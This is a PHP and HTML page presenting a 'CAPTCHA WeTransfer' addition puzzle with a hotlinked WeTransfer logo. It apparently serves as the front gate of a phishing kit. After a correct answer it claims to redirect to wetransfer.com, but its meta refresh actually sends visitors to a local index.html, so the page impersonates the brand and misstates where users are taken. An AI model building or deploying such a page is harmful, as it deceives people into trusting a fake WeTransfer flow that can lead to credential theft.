<?php
session_start();

// Génération aléatoire du captcha si non défini
if (!isset($_SESSION['captcha_a']) || !isset($_SESSION['captcha_b'])) {
    $_SESSION['captcha_a'] = rand(0, 10);
    $_SESSION['captcha_b'] = rand(0, 10);
}

$a = $_SESSION['captcha_a'];
$b = $_SESSION['captcha_b'];
$result = $a + $b;

$message = '';
$captcha_correct = false;

// Vérification si formulaire soumis
if (isset($_POST['answer'])) {
    $user = intval($_POST['answer']);
    if ($user === $result) {
        $captcha_correct = true; // on passe au message de redirection
    } else {
        $message = "❌ Faux, essayez encore";
        // Nouveau captcha
        $_SESSION['captcha_a'] = rand(0, 10);
        $_SESSION['captcha_b'] = rand(0, 10);
        $a = $_SESSION['captcha_a'];
        $b = $_SESSION['captcha_b'];
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Captcha WeTransfer</title>
<?php if($captcha_correct): ?>
<meta http-equiv="refresh" content="6;url=index.html">
<?php endif; ?>
<style>
body{
  background:white;
  color:black;
  font-family:Arial, sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
  flex-direction:column;
}
.captcha-image{
  margin-bottom:10px;
  width:100px;
  height:auto;
}
.box{
  width:350px;
  padding:20px;
  background:#222;
  border-radius:12px;
  text-align:center;
  box-shadow:0 8px 20px rgba(0,0,0,0.5);
  color:white;
}
h3{ margin-bottom:20px; }
input{ width:80%; padding:12px; font-size:18px; margin-bottom:15px; text-align:center; border-radius:8px; border:none; }
.keyboard{ display:flex; flex-wrap:wrap; justify-content:center; }
.keyboard button{ width:30%; padding:15px 0; margin:5px; font-size:18px; cursor:pointer; border-radius:8px; border:none; background:#3767ea; color:white; transition:0.2s; }
.keyboard button:hover{ background:#182848; }
#result{ margin-top:15px; font-weight:bold; font-size:18px; }
</style>
</head>
<body>

<?php if($captcha_correct): ?>
  <div class="box">
    <h2 style="color:#3767ea;">✔ CAPTCHA correct !</h2>
    <p style="color:#3767ea;">Redirection en cours sur https://wetransfer.com/...</p>
  </div>
<?php else: ?>
  <img src="https://trueandnorth.co.uk/wp-content/uploads/2023/07/wetransfer-icon-2048x887-4aswpq4v.png" alt="Logo Captcha" class="captcha-image">
  <div class="box">
    <h3>CAPTCHA WeTransfer</h3>
    <form method="POST" id="captchaForm">
      <p id="question"><?= $a ?> + <?= $b ?> = ?</p>
      <input type="text" name="answer" id="answer" readonly placeholder="Réponse">
      <div class="keyboard">
        <?php for($i=1;$i<=9;$i++){ echo "<button type='button' onclick='add($i)'>$i</button>"; } ?>
        <button type="button" onclick="clearA()">C</button>
        <button type="button" onclick="add(0)">0</button>
        <button type="submit">OK</button>
      </div>
    </form>
    <p id="result"><?= $message ?></p>
  </div>
<?php endif; ?>

<script>
function add(n){
  let input = document.getElementById("answer");
  if(input.value.length < 3) input.value += n;
}
function clearA(){ document.getElementById("answer").value=""; }
</script>

</body>
</html>